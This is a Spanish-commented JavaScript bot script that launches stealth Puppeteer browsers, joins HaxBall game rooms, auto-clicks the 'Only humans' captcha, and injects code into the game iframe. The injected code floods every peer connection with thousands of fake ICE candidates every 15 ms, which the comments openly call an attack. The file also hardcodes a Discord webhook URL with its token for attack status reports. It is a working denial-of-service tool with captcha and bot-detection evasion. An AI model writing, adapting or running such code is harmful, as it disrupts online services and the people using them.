const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());

const HAXBALL_ROOMS = process.env.HAXBALL_ROOMS.split(',');
const JOB_INDEX = parseInt(process.env.JOB_INDEX || 0);
const BOT_NICKNAME = process.env.JOB_ID || "bot";
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1393006720237961267/lxg_qUjPdnitvXt-aGzAwthMMwNbXyZIbPcgRVfGCSuLldynhFHJdsyC4sSH-Ymli5Xm";

function getRoomForJob() {
    if (!HAXBALL_ROOMS.length) return '';
    return HAXBALL_ROOMS[JOB_INDEX % HAXBALL_ROOMS.length].trim();
}

function handleCriticalError(error, context = '') {
    console.error(`❌ ERROR CRÍTICO ${context}:`, error);
    notifyDiscord(`🔴 **ERROR CRÍTICO** - Bot ${BOT_NICKNAME} cancelado. ${context}: ${error.message}`);
    process.exit(1);
}

process.on('uncaughtException', (error) => handleCriticalError(error, 'Excepción no capturada'));
process.on('unhandledRejection', (reason) => handleCriticalError(new Error(reason), 'Promesa rechazada'));

async function main() {
    const HAXBALL_ROOM_URL = getRoomForJob();
    console.log(`🤖 Bot ${BOT_NICKNAME} entrando a: ${HAXBALL_ROOM_URL}`);

    let browser, page;

    try {
        browser = await Promise.race([
            puppeteer.launch({ headless: true, args: ['--no-sandbox', '--disable-setuid-sandbox'] }),
            new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout al lanzar el navegador')), 30000))
        ]);

        page = await browser.newPage();

        const haxballCountryCodes = ["uy","ar","br","cn","ly","me","vi","cl","cy"];
        const randomCode = haxballCountryCodes[Math.floor(Math.random() * haxballCountryCodes.length)];
        await page.evaluateOnNewDocument((code) => {
            localStorage.setItem("geo", JSON.stringify({ lat: -34.6504, lon: -58.3878, code: code || 'ar' }));
        }, randomCode);

        await Promise.race([
            page.goto(HAXBALL_ROOM_URL, { waitUntil: 'networkidle2' }),
            new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout al cargar la página')), 30000))
        ]);

        await page.waitForSelector('iframe');
        const iframeElement = await page.$('iframe');
        const frame = await iframeElement.contentFrame();

        if (!frame) throw new Error('No se pudo acceder al iframe de Haxball');

        console.log("Escribiendo el nombre de usuario...");
        const nickSelector = 'input[data-hook="input"][maxlength="25"]';
        await frame.waitForSelector(nickSelector, { timeout: 15000 });
        const nickInput = await frame.$(nickSelector);
        await nickInput.click();
        await nickInput.type(BOT_NICKNAME);
        await nickInput.press('Enter');

        await new Promise(resolve => setTimeout(resolve, 5000));

        try {
            const onlyHumansButton = await frame.waitForSelector('button', { timeout: 5000 });
            await onlyHumansButton.click();
            console.log("✅ Captcha 'Only humans' clickeado automáticamente");
        } catch (e) {
            console.log("ℹ️ No apareció captcha, continuando...");
        }

        const chatSelector = 'input[data-hook="input"][maxlength="140"]';
        await frame.waitForSelector(chatSelector, { timeout: 10000 });
        console.log("✅ ¡Bot dentro de la sala! Iniciando ataque de flood...");
        await notifyDiscord(`🟢 El bot **${BOT_NICKNAME}** ha entrado y comenzará el ataque.`);

        // 🔥 ACTIVAR EL FLOOD DE ICE CANDIDATES
        console.log("💣 Iniciando flood de ICE candidates...");
        await startICEFlood(frame);

        // Mantener el bot activo mientras hace flood
        await new Promise(() => {}); // Nunca termina

    } catch (error) {
        console.error("❌ Error durante la ejecución del bot:", error);
        await notifyDiscord(`🔴 Error al intentar conectar el bot **${BOT_NICKNAME}**. Causa: ${error.message}`);
        if (browser) await browser.close();
        process.exit(1);
    }
}

async function startICEFlood(frame) {
    try {
        // Inyectar el código de flood DENTRO del iframe de Haxball
        await frame.evaluate(() => {
            console.log("🚀 Flood iniciado en el iframe...");
            
            // Buscar todas las RTCPeerConnection en el contexto del juego
            setInterval(() => {
                for (let key in window) {
                    try {
                        const pc = window[key];
                        if (pc && typeof pc.addIceCandidate === "function") {
                            // Enviar 2000 candidatos falsos
                            for (let i = 0; i < 2000; i++) {
                                pc.addIceCandidate({
                                    candidate: "candidate:1 1 udp 1 0.0.0.0 1 typ host",
                                    sdpMid: null,
                                    sdpMLineIndex: 999
                                }).catch(() => {});
                            }
                        }
                    } catch (e) {
                        // Ignorar errores
                    }
                }
            }, 15); // Cada 15ms = ~133k candidatos/segundo
        });
        
        console.log("✅ Flood de ICE candidates activado");
    } catch (error) {
        console.error("❌ Error al iniciar flood:", error);
        throw error;
    }
}
